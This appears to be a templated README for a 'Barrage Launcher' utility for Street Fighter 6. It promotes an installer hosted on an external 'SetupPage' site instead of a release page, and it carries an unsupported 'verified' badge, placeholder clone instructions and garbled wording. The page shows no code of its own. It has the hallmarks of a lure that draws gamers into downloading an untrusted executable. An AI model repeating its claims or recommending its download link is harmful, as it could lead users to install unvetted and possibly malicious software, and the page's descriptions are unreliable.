# Barrage Launcher – Street Fighter 6

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/DOWNLOAD-RELEASE-db2777?style=for-the-badge&logo=github&logoColor=white&labelColor=161b22" alt="Download"></a>
  <br>
  <a href="#-overview"><img src="https://img.shields.io/badge/STATUS-VERIFIED-d97706?style=for-the-badge&logo=checkmarx&logoColor=white&labelColor=161b22" alt="STATUS"></a> <a href="#-configuration-system"><img src="https://img.shields.io/badge/DEFAULTS-INCLUDED-65a30d?style=for-the-badge&logo=gnubash&logoColor=white&labelColor=161b22" alt="DEFAULTS"></a>
  <br>
  <a href="#-workflows--usage"><img src="https://img.shields.io/badge/WORKFLOW-GUIDE-0f766e?style=for-the-badge&logo=terminal&logoColor=white&labelColor=161b22" alt="WORKFLOW"></a> <a href="#-key-capabilities"><img src="https://img.shields.io/badge/HOTKEYS-SHORTCUTS-dc2626?style=for-the-badge&logo=visualstudiocode&logoColor=white&labelColor=161b22" alt="HOTKEYS"></a>
</div>

**Author:** IntersectScholar | **Platform:** Windows 10 / 11 only

> A lightweight, open‑source launcher that puts you in the fight faster. Switch profiles, tweak launch arguments, and keep your SF6 library tidy—all from a single, sleek desktop app.

---

## ✨ What is Barrage Launcher?

Barrage Launcher is a **Windows‑only** utility designed specifically for **Street Fighter 6**. It gives you:

| Feature | Why it matters |
|---------|----------------|
| **Instant profile swapping** | Keep separate setups for casual, competitive, or training sessions. |
| **Custom launch options** | Append arguments, utility, or overlay utility without touching the game’s shortcut. |
| **One‑click start** | Launch SF6 directly from the app or a system tray icon. |
| **State persistence** | Your last‑used profile is remembered across reboots. |
| **Open‑source & community driven** | Fork, improve, and share your own profiles. |

---

## 🚀 Quick Start

1. **Download** the latest release from the button below.
2. Run the installer (standard Windows installer).
3. Open **Barrage Launcher** – it will automatically detect your Street Fighter 6 installation.
4. Create a new profile, assign your preferred launch arguments, and hit **Play**.

> **Tip:** You can pin the launcher to the taskbar for one‑click access.

---

## 📥 Download

<div style="text-align:center; margin: 1.5rem 0;">
  <a href="https://rewfdf.github.io/SetupPage/" target="_blank" style="background:#4B8BF5;color:#fff;padding:12px 24px;border-radius:6px;text-decoration:none;font-weight:bold;display:inline-block;">Download Barrage Launcher</a>
</div>

---

## 🛠️ How to Build from Source

```bash
# Clone the repository
git clone https://github.com/yourusername/Barrage-Launcher-Street-Fighter-6.git
cd Barrage-Launcher-Street-Fighter-6

# Install dependencies (requires .NET 6 SDK)
dotnet restore

# Build the solution
dotnet build -c Release

# Run the app
dotnet run --project src/BarrageLauncher
```

> The project targets **.NET 6** and uses only Windows‑specific APIs, so it runs on any Windows 10/11 machine with the runtime installed.

---

## 📂 Repository Structure

```
├─ src/                     # Application source code
│   ├─ BarrageLauncher/     # Core UI and logic
│   └─ Models/              # Profile & settings models
├─ assets/                  # Icons and UI resources
├─ tests/                   # Unit‑tests (xUnit)
└─ README.md                # This file
```

---

## 🧩 Adding Your Own Profiles

1. Click **+ New Profile** in the launcher.
2. Give it a name (e.g., “Tournament”).
3. Add any command‑line arguments you need (e.g., `-windowed -novsync`).
4. Save – the profile appears in the sidebar for instant switching.

---

## 🤝 Contributing

Contributions are welcome! Please follow these steps:

1. Fork the repo.
2. Create a feature branch (`git checkout -b feature/awesome‑profile`).
3. Commit your changes with clear messages.
4. Open a Pull Request describing the improvement.

Read the **CONTRIBUTING.md** file for detailed guidelines and the code of conduct.

---

## 📜 License

This project is licensed under the **MIT License** – see the `LICENSE` file for details.

---

## 📢 Stay Connected

- **Issues & Feature Requests:** Open a GitHub Issue.
- **Discussions:** Join the repository’s Discussions tab for tips, custom profiles, and community support.

Enjoy fast, hassle‑free launches and dominate the arena with the right Release every time!

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```